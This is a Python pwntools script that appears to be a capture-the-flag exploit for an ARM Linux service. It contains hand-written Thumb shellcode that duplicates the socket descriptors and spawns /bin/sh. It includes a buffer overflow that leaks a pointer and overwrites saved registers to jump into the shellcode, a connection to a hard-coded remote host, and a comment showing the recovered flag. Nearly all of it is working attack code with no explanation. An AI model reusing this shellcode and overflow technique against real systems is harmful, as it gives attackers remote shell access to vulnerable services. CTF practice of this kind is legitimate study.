from pwn import *
import re

context.update(arch='arm', os='linux', endian='little')


thumbjmp = asm("""
    add     r6, pc, #1
    bx      r6""")

dup = asm("""
    movs r7, #0x3f  @ dup
    pop {r0}
    pop {r0}        @ get socket
    eors r1, r1
    svc 1
    movs r1, #1
    svc 1
    movs r1, #2
    svc 1
""", arch='thumb')

execbin = asm("""
    eors    r0, r0
    add     r0, pc
    adds    r0, #12
    eors    r1, r1
    eors    r2, r2
    movs    r7, #11
    svc     1
    movs    r7, #1
    svc     1

    .asciz "//bin/sh"
""", arch='thumb')

shellcode = thumbjmp + dup + execbin


def do_create(r, p1, p2, ns=2147483647):
    r.sendline("create")
    # name
    r.recv()
    r.sendline(p1)
    r.recv()
    # tags

    r.sendline(p2)
    r.recv()
    r.sendline("%d" % ns)


def do_print(r):
    r.sendline('print')
    return r.recvuntil("$> ")


def exploit(r):
    stackvar = 0xf6ffe464  # how can we leak it?

    payload = flat(shellcode, "A"*(211-len(shellcode)))

    r.recvuntil("$> ")

    do_create(r, payload, 'A'*83)
    r.recvuntil("$> ")

    do_create(r, "A"*211, 'A'*83)
    r.recvuntil("$> ")

    leak = do_print(r)

    print leak
    leak = re.findall(r"\[.*\]", leak)[0]
    leak = leak[197:200]+'\x00'

    nextelement = u32(leak)
    print hex(nextelement)

    payload = flat(
        "A"*212,
        p32(stackvar-1032),  # push in r11 the address of the socket var
        p32(nextelement),
        shellcode
    )

    do_create(r, payload, "A")

    r.interactive()

# $ echo ./*
# ./bin ./dev ./flag-wuemuoH2phiK2oi3Ooph5ABe.txt
# $ cat ./flag-wuemuoH2phiK2oi3Ooph5ABe.txt
# flag-{intr0-70-ARM-pwn4g3-4-fuN-n-pr0Fi7}


if __name__ == "__main__":
    host = "52.72.171.221"
    port = 9981

    with remote(host, port) as r:
        exploit(r)
